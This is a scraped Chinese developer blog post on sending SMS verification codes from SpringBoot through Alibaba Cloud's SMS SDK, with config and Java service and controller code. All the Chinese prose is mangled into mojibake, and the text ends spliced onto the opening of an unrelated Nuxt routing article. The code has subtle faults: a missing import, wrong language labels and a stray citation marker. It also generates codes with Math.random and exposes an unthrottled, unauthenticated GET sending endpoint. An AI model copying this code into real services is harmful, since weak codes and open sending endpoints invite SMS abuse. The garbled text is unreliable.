            ä¸‰æ­¥æå®šçŸ­ä¿¡éªŒè¯ç ï¼SpringBooté›†æˆé˜¿é‡Œäº‘çŸ­ä¿¡å®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3139860942296830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‚Ÿç©ºç å­—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:55:01.000Z" title="Tue Jan 13 2026 03:55:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°æ‚Ÿã€‚</p>
<p>åœ¨SpringBooté¡¹ç›®ä¸­é›†æˆé˜¿é‡Œäº‘çŸ­ä¿¡æœåŠ¡ï¼Œæ ¸å¿ƒæ˜¯å®Œæˆä¸€ç³»åˆ—å‰ç½®ç”³è¯·ï¼Œå¹¶è°ƒç”¨å…¶å®˜æ–¹SDKå‘é€çŸ­ä¿¡ã€‚æ•´ä¸ªæµç¨‹ä»å‰ç½®å‡†å¤‡åˆ°ä»£ç é›†æˆï¼Œæ­¥éª¤æ¸…æ™°ã€‚</p>
<h3 data-id="heading-0">é˜¿é‡Œäº‘çŸ­ä¿¡æœåŠ¡æ¦‚è¿°</h3>
<p>é˜¿é‡Œäº‘çŸ­ä¿¡æœåŠ¡æä¾›é«˜å¹¶å‘ã€å®‰å…¨çš„å…¨çƒçŸ­ä¿¡å‘é€èƒ½åŠ›ï¼Œæ”¯æŒéªŒè¯ç ã€é€šçŸ¥ã€è¥é”€ç­‰åœºæ™¯ã€‚å…¶ä¸»è¦ç‰¹ç‚¹å¦‚ä¸‹ï¼š</p>

























<table><thead><tr><th align="left">ç‰¹æ€§ç»´åº¦</th><th align="left">å…·ä½“è¯´æ˜</th></tr></thead><tbody><tr><td align="left"><strong>æ ¸å¿ƒèƒ½åŠ›</strong></td><td align="left">æä¾›ä¸‰ç½‘åˆä¸€é€šé“ï¼Œç§’çº§å¯è¾¾ï¼Œæ”¯æŒå›½å†…åŠå…¨çƒ200å¤šä¸ªå›½å®¶/åœ°åŒºã€‚</td></tr><tr><td align="left"><strong>å®‰å…¨ä¸ç®¡æ§</strong></td><td align="left">åŸºäºé˜¿é‡Œäº‘è´¦æˆ·ä¸RAMæƒé™ç®¡ç†ï¼Œæ”¯æŒè®¾ç½®æ—¥å‘é€é‡ä¸Šé™ã€å•ç”¨æˆ·é¢‘æ¬¡é˜ˆå€¼ï¼Œå¹¶å…·å¤‡éªŒè¯ç é˜²ç›—åˆ·ç›‘æ§ã€‚</td></tr><tr><td align="left"><strong>è®¡è´¹æ¨¡å¼</strong></td><td align="left">é‡‡ç”¨<strong>çŸ­ä¿¡å¥—é¤åŒ…</strong>ä¼˜å…ˆæŠµæ‰£ï¼Œè¶…å‡ºå<strong>æŒ‰é‡è®¡è´¹</strong>çš„æ¨¡å¼ã€‚å›½å†…éªŒè¯ç /é€šçŸ¥çŸ­ä¿¡ä½è‡³0.045å…ƒ/æ¡èµ·ã€‚</td></tr><tr><td align="left"><strong>ä½¿ç”¨é™åˆ¶</strong></td><td align="left"><strong>ä»…æ”¯æŒä¼ä¸šè®¤è¯è´¦å·</strong>ï¼›å‘é€å‰éœ€å®Œæˆ<strong>èµ„è´¨ã€ç­¾åã€æ¨¡æ¿</strong>çš„ç”³è¯·ä¸å®¡æ ¸ï¼›å¯¹å‘é€é¢‘ç‡æœ‰ä¸¥æ ¼é™åˆ¶ï¼ˆä¾‹å¦‚éªŒè¯ç åŒä¸€å·ç æœ€å¤š1æ¡/åˆ†é’Ÿï¼‰ã€‚</td></tr></tbody></table>
<h3 data-id="heading-1">é›†æˆå‰å¿…é¡»å®Œæˆçš„æ§åˆ¶å°é…ç½®</h3>
<p>ç¼–å†™ä»£ç å‰ï¼Œä½ å¿…é¡»åœ¨é˜¿é‡Œäº‘æ§åˆ¶å°å®Œæˆä¸€ç³»åˆ—é…ç½®ï¼Œè¿™æ˜¯çŸ­ä¿¡å‘é€çš„å‰æã€‚</p>
<ol>
<li><strong>å¼€é€šæœåŠ¡ä¸è´­ä¹°èµ„æºåŒ…</strong>
<ul>
<li>å®Œæˆ<strong>ä¼ä¸šå®åè®¤è¯</strong>å¹¶ç™»å½•çŸ­ä¿¡æœåŠ¡æ§åˆ¶å°å¼€é€šæœåŠ¡ã€‚</li>
<li>æ ¹æ®ä¸šåŠ¡éœ€è¦ï¼ˆå›½å†…æˆ–å›½é™…ï¼‰<strong>è´­ä¹°çŸ­ä¿¡å¥—é¤åŒ…</strong>ã€‚</li>
</ul>
</li>
<li><strong>åˆ›å»ºAccessKey</strong>
<ul>
<li>ä¸ºå®‰å…¨èµ·è§ï¼Œå»ºè®®ä¸ºåº”ç”¨åˆ›å»º<strong>RAMå­ç”¨æˆ·</strong>å¹¶æˆæƒ<code>AliyunDysmsFullAccess</code>ç­–ç•¥ã€‚</li>
<li>ä¸ºè¯¥å­ç”¨æˆ·åˆ›å»º<strong>AccessKeyï¼ˆAccessKey IDå’ŒAccessKey Secretï¼‰</strong>ï¼Œåç»­ä»£ç å°†ä½¿ç”¨å®ƒè°ƒç”¨APIã€‚<strong>åˆ‡å‹¿ç›´æ¥ä½¿ç”¨ä¸»è´¦å·çš„AccessKey</strong>ã€‚</li>
</ul>
</li>
<li><strong>ç”³è¯·çŸ­ä¿¡ç­¾åä¸æ¨¡æ¿</strong>
<ul>
<li><strong>ç­¾å</strong>ï¼šåœ¨â€œå›½å†…æ¶ˆæ¯â€æˆ–â€œå›½é™…/æ¸¯æ¾³å°æ¶ˆæ¯â€èœå•ä¸‹ç”³è¯·ã€‚ç­¾åæ˜¯æ˜¾ç¤ºåœ¨çŸ­ä¿¡å¼€å¤´çš„æ ‡è¯†ï¼Œå¦‚<code>ã€ä¼ä¸šåç§°ã€‘</code>ï¼Œç”¨äºæ ‡è¯†å‘é€æ–¹ã€‚å®¡æ ¸é€šå¸¸éœ€2å°æ—¶ã€‚</li>
<li><strong>æ¨¡æ¿</strong>ï¼šçŸ­ä¿¡å†…å®¹æ¨¡æ¿ï¼Œæ”¯æŒå˜é‡ã€‚ä¾‹å¦‚éªŒè¯ç æ¨¡æ¿ï¼šâ€œæ‚¨çš„éªŒè¯ç ä¸ºï¼š${code}ï¼Œ5åˆ†é’Ÿå†…æœ‰æ•ˆã€‚â€æ¨¡æ¿å®¡æ ¸åŒæ ·çº¦éœ€2å°æ—¶ã€‚</li>
<li><strong>é‡è¦æç¤º</strong>ï¼šç­¾åå’Œæ¨¡æ¿å‡<strong>å®¡æ ¸é€šè¿‡å</strong>æ–¹å¯ä½¿ç”¨ã€‚å›½å†…ç­¾åè¿˜éœ€å®Œæˆ<strong>è¿è¥å•†å®åæŠ¥å¤‡</strong>ï¼ˆéœ€7-15ä¸ªå·¥ä½œæ—¥ï¼‰ï¼ŒæŠ¥å¤‡æˆåŠŸå‰å‘é€å¯èƒ½å¤±è´¥ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-2">SpringBooté¡¹ç›®é›†æˆè¯¦ç»†æ­¥éª¤</h3>
<p>å®Œæˆæ§åˆ¶å°é…ç½®åï¼Œå³å¯åœ¨SpringBooté¡¹ç›®ä¸­é›†æˆã€‚</p>
<p><strong>ç¬¬1æ­¥ï¼šæ·»åŠ Mavenä¾èµ–</strong>
åœ¨é¡¹ç›®çš„<code>pom.xml</code>ä¸­æ·»åŠ é˜¿é‡Œäº‘çŸ­ä¿¡æœåŠ¡SDKçš„ä¾èµ–ã€‚</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.aliyun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>dysmsapi20180501<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <span class="hljs-comment">&lt;!-- è¯·ä½¿ç”¨Mavenä»“åº“ä¸­çš„æœ€æ–°ç‰ˆæœ¬ --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><strong>ç¬¬2æ­¥ï¼šé…ç½®åº”ç”¨å‚æ•°</strong>
åœ¨<code>application.yml</code>æˆ–<code>application.properties</code>ä¸­é…ç½®å¿…è¦çš„å‚æ•°ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml é…ç½®ç¤ºä¾‹</span>
<span class="hljs-attr">aliyun:</span>
  <span class="hljs-attr">sms:</span>
    <span class="hljs-comment"># ä»æ§åˆ¶å°è·å–çš„AccessKeyä¿¡æ¯</span>
    <span class="hljs-attr">access-key-id:</span> <span class="hljs-string">your-access-key-id</span>
    <span class="hljs-attr">access-key-secret:</span> <span class="hljs-string">your-access-key-secret</span>
    <span class="hljs-comment"># çŸ­ä¿¡æœåŠ¡æ¥å…¥ç‚¹ï¼ˆEndpointï¼‰ï¼Œå›½å†…ä¸€èˆ¬ä¸º dysmsapi.aliyuncs.com</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">dysmsapi.aliyuncs.com</span>
    <span class="hljs-comment"># æ§åˆ¶å°ç”³è¯·å¹¶é€šè¿‡å®¡æ ¸çš„ç­¾ååç§°ï¼ˆæ— éœ€åŠ ã€ã€‘ï¼‰</span>
    <span class="hljs-attr">sign-name:</span> <span class="hljs-string">ä½ çš„ç­¾å</span>
    <span class="hljs-comment"># æ§åˆ¶å°ç”³è¯·å¹¶é€šè¿‡å®¡æ ¸çš„æ¨¡æ¿CODE</span>
    <span class="hljs-attr">template-code:</span> <span class="hljs-string">SMS_123456789</span>
</code></pre>
<p><strong>ç¬¬3æ­¥ï¼šåˆ›å»ºé…ç½®ç±»ä¸Service</strong>
åˆ›å»ºä¸€ä¸ªé…ç½®ç±»æ¥åˆå§‹åŒ–SDKå®¢æˆ·ç«¯ï¼Œå¹¶ç¼–å†™å‘é€çŸ­ä¿¡çš„æœåŠ¡ç±»ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.aliyun.dysmsapi20180501.Client;
<span class="hljs-keyword">import</span> com.aliyun.teaopenapi.models.Config;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.<span class="hljs-keyword">annotation</span>.Value;
<span class="hljs-keyword">import</span> org.springframework.context.<span class="hljs-keyword">annotation</span>.Bean;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AliyunSmsConfig</span> {

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${aliyun.sms.access-key-id}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String accessKeyId;

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${aliyun.sms.access-key-secret}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String accessKeySecret;

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${aliyun.sms.endpoint}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String endpoint;

    <span class="hljs-comment">/**
     * åˆ›å»ºå¹¶è¿”å›é˜¿é‡Œäº‘çŸ­ä¿¡æœåŠ¡çš„Clientå®ä¾‹ã€‚
     * è¯¥Beanå¯ç”¨äºæ•´ä¸ªSpringå®¹å™¨ã€‚
     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> Client createClient() throws Exception {
        Config config = new Config()
                .setAccessKeyId(accessKeyId)
                .setAccessKeySecret(accessKeySecret);
        config.endpoint = endpoint;
        <span class="hljs-keyword">return</span> new Client(config);
    }
}
</code></pre>

<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.aliyun.dysmsapi20180501.Client;
<span class="hljs-keyword">import</span> com.aliyun.dysmsapi20180501.models.SendMessageWithTemplateRequest;
<span class="hljs-keyword">import</span> com.aliyun.dysmsapi20180501.models.SendMessageWithTemplateResponse;
<span class="hljs-keyword">import</span> com.aliyun.teautil.models.RuntimeOptions;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.<span class="hljs-keyword">annotation</span>.Autowired;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.<span class="hljs-keyword">annotation</span>.Value;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> Client smsClient;

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${aliyun.sms.sign-name}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String signName;

    <span class="hljs-meta">@Value(<span class="hljs-string">"<span class="hljs-subst">${aliyun.sms.template-code}</span>"</span>)</span>
    <span class="hljs-keyword">private</span> String templateCode;

    <span class="hljs-comment">/**
     * å‘é€çŸ­ä¿¡éªŒè¯ç 
     * <span class="hljs-doctag">@param</span> phoneNumber ç›®æ ‡æ‰‹æœºå·ï¼ˆå›½å†…å·ç éœ€å¸¦å›½é™…åŒºå·86ï¼‰
     * <span class="hljs-doctag">@param</span> templateParam æ¨¡æ¿å˜é‡å¯¹åº”çš„JSONå­—ç¬¦ä¸²ï¼Œå¦‚ï¼š{"code":"123456"}
     * <span class="hljs-doctag">@return</span> æ˜¯å¦å‘é€æˆåŠŸ
     */</span>
    <span class="hljs-keyword">public</span> boolean sendSms(String phoneNumber, String templateParam) {
        <span class="hljs-keyword">try</span> {
            SendMessageWithTemplateRequest request = new SendMessageWithTemplateRequest()
                    .setTo(phoneNumber) <span class="hljs-comment">// æ¥æ”¶æ–¹æ‰‹æœºå·</span>
                    .setSignName(signName) <span class="hljs-comment">// çŸ­ä¿¡ç­¾å</span>
                    .setTemplateCode(templateCode) <span class="hljs-comment">// çŸ­ä¿¡æ¨¡æ¿CODE</span>
                    .setTemplateParam(templateParam); <span class="hljs-comment">// æ¨¡æ¿å˜é‡JSON</span>

            RuntimeOptions runtime = new RuntimeOptions();
            SendMessageWithTemplateResponse response = smsClient.sendMessageWithTemplateWithOptions(request, runtime);

            <span class="hljs-comment">// æ ¹æ®å“åº”åˆ¤æ–­æ˜¯å¦æˆåŠŸï¼Œ"OK"è¡¨ç¤ºæˆåŠŸ[citation:4]</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">"OK"</span>.equals(response.getBody().getResponseCode());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-comment">// æ­¤å¤„åº”è®°å½•æ—¥å¿—ï¼Œå¹¶æ ¹æ®ä¸šåŠ¡éœ€è¦è¿›è¡Œå¼‚å¸¸å¤„ç†</span>
            e.printStackTrace();
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
}
</code></pre>
<p><strong>ç¬¬4æ­¥ï¼šåœ¨Controllerä¸­è°ƒç”¨</strong>
åˆ›å»ºä¸€ä¸ªç®€å•çš„æ§åˆ¶å™¨æ¥æä¾›å‘é€çŸ­ä¿¡çš„HTTPæ¥å£ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">beans</span>.<span class="hljs-property">factory</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">Autowired</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">web</span>.<span class="hljs-property">bind</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">GetMapping</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">web</span>.<span class="hljs-property">bind</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">RequestParam</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">web</span>.<span class="hljs-property">bind</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">RestController</span>;

<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">SmsService</span> smsService;

    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/sendCode"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">sendVerificationCode</span>(<span class="hljs-params"><span class="hljs-meta">@RequestParam</span> <span class="hljs-built_in">String</span> phone</span>) {
        <span class="hljs-comment">// ç”ŸæˆéšæœºéªŒè¯ç ï¼ˆç¤ºä¾‹ï¼‰</span>
        <span class="hljs-title class_">String</span> code = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">valueOf</span>((int)((<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">9</span> + <span class="hljs-number">1</span>) * <span class="hljs-number">100000</span>));
        <span class="hljs-comment">// æ„é€ æ¨¡æ¿å‚æ•°ï¼ˆå¿…é¡»ä¸ç”³è¯·æ¨¡æ¿æ—¶çš„å˜é‡åä¸€è‡´ï¼‰</span>
        <span class="hljs-title class_">String</span> templateParam = <span class="hljs-string">"{\"code\":\""</span> + code + <span class="hljs-string">"\"}"</span>;

        <span class="hljs-built_in">boolean</span> isSuccess = smsService.<span class="hljs-title function_">sendSms</span>(phone, templateParam);
        <span class="hljs-keyword">if</span> (isSuccess) {
            <span class="hljs-comment">// åœ¨å®é™…ä¸šåŠ¡ä¸­ï¼Œæ­¤å¤„åº”å°†éªŒè¯ç ä¸æ‰‹æœºå·å…³è”å¹¶å­˜å…¥ç¼“å­˜ï¼ˆå¦‚Redisï¼‰ï¼Œè®¾ç½®æœ‰æ•ˆæœŸ</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">"éªŒè¯ç å‘é€æˆåŠŸï¼"</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"éªŒè¯ç å‘é€å¤±è´¥ï¼Œè¯·ç¨åé‡è¯•ã€‚"</span>;
        }
    }
}
</code></pre>
<h3 data-id="heading-3">æ€»ç»“</h3>
<p>æŒ‰ç…§ä¸Šè¿°æ­¥éª¤ï¼Œå³å¯åœ¨SpringBooté¡¹ç›®ä¸­é›†æˆé˜¿é‡Œäº‘çŸ­ä¿¡ã€‚æœ€åï¼Œæœ‰å‡ ä¸ªå…³é”®ç‚¹éœ€è¦æ³¨æ„ï¼š</p>
<ol>
<li><strong>èµ„è´¨ä¸å®¡æ ¸æ˜¯å…³é”®å‰æ</strong>ï¼šåŠ¡å¿…ç¡®ä¿ä½¿ç”¨<strong>ä¼ä¸šè®¤è¯è´¦å·</strong>ï¼Œå¹¶æå‰å®Œæˆ<strong>ç­¾åã€æ¨¡æ¿çš„ç”³è¯·å’Œå®¡æ ¸</strong>ã€‚å›½å†…ç­¾åè¿˜éœ€è¦ç­‰å¾…<strong>è¿è¥å•†æŠ¥å¤‡æˆåŠŸ</strong>ï¼Œå¦åˆ™å‘é€ä¼šå¤±è´¥ã€‚</li>
<li><strong>å®‰å…¨ç¬¬ä¸€</strong>ï¼šAccessKeyç›¸å½“äºè´¦å·å¯†ç ï¼Œ<strong>åŠ¡å¿…é€šè¿‡ç¯å¢ƒå˜é‡æˆ–é…ç½®æœåŠ¡å™¨ç®¡ç†</strong>ï¼Œåˆ‡å¿Œç¡¬ç¼–ç åœ¨ä»£ç ä¸­æäº¤è‡³ç‰ˆæœ¬åº“ã€‚</li>
<li><strong>å…³æ³¨é™åˆ¶ä¸æˆæœ¬</strong>ï¼šä¸¥æ ¼éµå®ˆå‘é€é¢‘ç‡é™åˆ¶ï¼ˆå¦‚1æ¡/åˆ†é’Ÿ/å·ï¼‰ã€‚å‘é€æµ‹è¯•çŸ­ä¿¡ä¹Ÿä¼šäº§ç”Ÿè´¹ç”¨ï¼Œè¯·æ³¨æ„è´¦æˆ·ä½™é¢ã€‚</li>
<li><strong>ç”Ÿäº§ç¯å¢ƒå»ºè®®</strong>ï¼šåº”è€ƒè™‘<strong>å¼‚æ­¥å‘é€ã€å¤±è´¥é‡è¯•ã€å‘é€çŠ¶æ€å›æ‰§ï¼ˆSmsReportï¼‰æ¥æ”¶</strong>ç­‰æœºåˆ¶ä»¥æå‡ç¨³å®šæ€§å’Œå¯é æ€§ã€‚</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cba60b7563e14645bc867d4350fda14d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881301&amp;x-signature=zC%2FIyzvoYxElZx3d7DwFBUa5CnY%3D" alt="ä¸‰æ­¥æå®šçŸ­ä¿¡éªŒè¯ç ï¼SpringBooté›†æˆé˜¿é‡Œäº‘çŸ­ä¿¡å®æˆ˜.png" loading="lazy"/></p>
<p><strong>è°¢è°¢ä½ çœ‹æˆ‘çš„æ–‡ç« ï¼Œæ—¢ç„¶çœ‹åˆ°è¿™é‡Œäº†ï¼Œå¦‚æœè§‰å¾—ä¸é”™ï¼Œéšæ‰‹ç‚¹ä¸ªèµã€è½¬å‘ã€åœ¨çœ‹ä¸‰è¿å§ï¼Œæ„Ÿè°¢æ„Ÿè°¢ã€‚é‚£æˆ‘ä»¬ï¼Œä¸‹æ¬¡å†è§ã€‚</strong></p>
<p>æ‚¨çš„ä¸€é”®ä¸‰è¿ï¼Œæ˜¯æˆ‘æ›´æ–°çš„æœ€å¤§åŠ¨åŠ›ï¼Œè°¢è°¢</p>
<p>å±±æ°´æœ‰ç›¸é€¢ï¼Œæ¥æ—¥çš†å¯æœŸï¼Œè°¢è°¢é˜…è¯»ï¼Œæˆ‘ä»¬å†ä¼š</p>
<p>æˆ‘æ‰‹ä¸­çš„é‡‘ç®æ£’ï¼Œä¸Šèƒ½é€šå¤©ï¼Œä¸‹èƒ½æ¢æµ·</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[nuxt è·¯ç”±ä¸€ç¯‡è®²æ¸…æ¥š]]></title>    <link>https://juejin.cn/post/7594310266411155456</link>    <guid>https://juejin.cn/post/7594310266411155456</guid>    <pubDate>2026-01-13T01:31:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594310266411155456" data-draft-id="7593234983755251722" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="nuxt è·¯ç”±ä¸€ç¯‡è®²æ¸…æ¥š"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-13T01:31:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ±Ÿæ¹–æ–‡äºº"/> <meta itemprop="url" content="https://juejin.cn/user/3044986347066480"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            nuxt è·¯ç”±ä¸€ç¯‡è®²æ¸…æ¥š
